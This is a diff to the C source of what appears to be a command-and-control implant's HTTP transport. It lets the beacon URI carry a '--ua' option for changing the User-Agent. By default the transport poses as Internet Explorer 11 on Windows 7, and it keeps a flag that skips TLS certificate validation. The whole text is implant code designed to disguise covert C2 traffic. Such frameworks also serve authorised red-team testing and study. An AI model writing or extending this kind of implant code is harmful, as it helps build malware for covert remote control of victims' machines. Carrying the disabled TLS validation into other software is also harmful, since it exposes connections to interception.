@@ -7,6 +7,7 @@
 #include <stdbool.h>
 #include <stdlib.h>
 
+#include "argv_split.h"
 #include "c2.h"
 #include "http_client.h"
 #include "log.h"
@@ -139,13 +140,29 @@ int http_transport_init(struct c2_transport *t)
 	}
 
 	ctx->data.content_type = "application/octet-stream";
-	//ctx->data.flags = HTTP_DATA_COMPRESS;
 	ctx->opts.flags = HTTP_OPTS_SKIP_TLS_VALIDATION;
 
-	ctx->headers[0] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
-	ctx->headers[1] = "Connection: close";
+	char *ua = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
+	char *args = strchr(ctx->uri, '|');
+	if (args) {
+		*args = '\0';
+		if (strlen(++args)) {
+			size_t argc = 0;
+			char **argv = argv_split(args, NULL, &argc);
+			for (size_t i = 0; i < argc; i++) {
+				if (strcmp(argv[i], "--ua") == 0 && argv[i + 1]) {
+					ua = argv[i + 1];
+				}
+			}
+		}
+	}
+
+	ctx->data.num_headers = 1;
+	ctx->headers[0] = strdup("Connection: close");
+	if (asprintf(&ctx->headers[ctx->data.num_headers], "User-Agent: %s", ua) > 0) {
+		ctx->data.num_headers++;
+	}
 	ctx->data.headers = ctx->headers;
-	ctx->data.num_headers = 2;
 
 	ctx->first_packet = 1;
 
